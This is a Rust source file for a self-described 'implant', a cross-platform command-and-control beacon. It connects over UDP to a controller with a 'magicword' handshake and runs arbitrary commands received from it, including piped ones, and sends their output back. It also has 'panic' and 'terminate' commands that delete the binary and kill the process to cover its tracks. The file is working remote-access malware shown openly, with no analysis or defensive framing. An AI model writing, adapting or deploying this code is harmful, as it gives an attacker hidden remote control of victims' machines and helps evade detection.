#![feature(type_ascription)]

extern crate sys_info;

use std::net::UdpSocket;
use std::thread::sleep;
use std::time;
use std::process::{Command,Stdio,id};
use sys_info::os_type;

static mut beacontime: u64 = 20;
static sockettime: u64 = 25;

fn main() {
    unsafe {let secs = time::Duration::from_secs(beacontime); 
    sleep(secs); }
    let mut socket = UdpSocket::bind("0.0.0.0:33267").expect("Socket failed to open.");
    socket.connect("0.0.0.0:42303").expect("Failed to connect on UDP"); //victim's IP
    let secret = "magicword".as_bytes();
    socket.send_to(&secret,"0.0.0.0:42303"); //victim's IP
    //socket.send(&secret);
    let mut buf = [0;4];
    let _incoming = socket.recv(&mut buf);
    match String::from_utf8_lossy(&buf).as_ref() {
        "int1" => threaded(&mut socket),
        _ => println!("Connection Failed"),
    }
}

fn threaded(socket: &mut UdpSocket) {
    loop {
        unsafe {let secs = time::Duration::from_secs(beacontime); 
        sleep(secs); }
        socket.send(&"GC".as_bytes());
        let mut buf = [0;1000];
        let result = socket.set_read_timeout(Some(time::Duration::from_secs(sockettime)));
        match socket.recv(&mut buf) {
            Ok(received) =>  execution(socket, &mut buf),
            Err(e) => sec_execution(socket),
        }
    }
}


fn execution(socket: &mut UdpSocket,buf: &mut [u8]) {
    let my_string = String::from_utf8_lossy(&buf);
    let mut split = my_string.split("\n");
    let main_command = split.next().unwrap();
    let string2: Vec<&str> = main_command.split(" ").collect();  
    if string2[0]=="beacon" {
        unsafe {beacontime : u64 =  string2[1].parse::<u64>().unwrap();}
    } else if string2[0]=="panic" {
        if os_type().unwrap()=="Linux" {
            let pid = id().to_string();
            socket.send(b"");
            Command::new("rm").arg("-f").arg("implant").output().expect("failed to execute");
            Command::new("kill").arg("-9").arg(&pid).output().expect("failed to execute");
        } else if os_type().unwrap()=="Windows" {
            let pid = id().to_string();
            socket.send(b"");
            Command::new("del").arg("implant.exe").output().expect("failed to execute");
            Command::new("taskkill").arg("/F").arg("/PID").arg(&pid).output().expect("failed to execute");
        } else if os_type().unwrap()=="Darwin" {
            let pid = id().to_string();
            socket.send(b"");
            Command::new("rm").arg("-f").arg("implant").output().expect("failed to execute");
            Command::new("kill").arg("-9").arg(&pid).output().expect("failed to execute");
        }       
    } else if string2[0]=="terminate" {
        if os_type().unwrap()=="Linux" {
            let pid = id().to_string();
            socket.send(b"");
            Command::new("kill").arg("-9").arg(&pid).output().expect("failed to execute");
        } else if os_type().unwrap()=="Windows" {
            let pid = id().to_string();
            socket.send(b"");
            Command::new("taskkill").arg("/F").arg("/PID").arg(&pid).output().expect("failed to execute");
        } else if os_type().unwrap()=="Darwin" {
            let pid = id().to_string();
            socket.send(b"");
            Command::new("kill").arg("-9").arg(&pid).output().expect("failed to execute");
        }
    } else if main_command.contains("|") {
        pipedexecution(socket, main_command.to_string());
    } else {
        if let Ok(command) = Command::new(&string2[0]).args(&string2[1..]).output() {
            socket.send(&command.stdout);
        }
        else {
            socket.send(b"");
        };
    }
}

fn sec_execution(socket: &mut UdpSocket){
    unsafe {let secs = time::Duration::from_secs(beacontime);
    sleep(secs);}
    let mut buf = [0;10];
    let result = socket.set_read_timeout(Some(time::Duration::from_secs(sockettime)));
    match socket.recv(&mut buf) {
        Ok(received) =>  execution(socket, &mut buf),
        Err(e) => {},
    }
}

fn pipedexecution(socket: &mut UdpSocket,main_command: String) {
    let string3: Vec<&str> = main_command.split("|").collect();
    let string4: Vec<&str> = string3[0].split(" ").collect();
    let string5: Vec<&str> = string3[1].split(" ").collect();
    if let Ok(fp1) = Command::new(string4[0]).args(&string4[1..]).stdout(Stdio::piped()).spawn() {
        if let Ok(fp2) = Command::new(string5[0]).args(&string5[1..]).stdin(fp1.stdout.expect("Command failed")).output() {
            socket.send(&fp2.stdout);
        }
        else {
            socket.send(b"");
        }
    } else {
        socket.send(b"");
    }
}
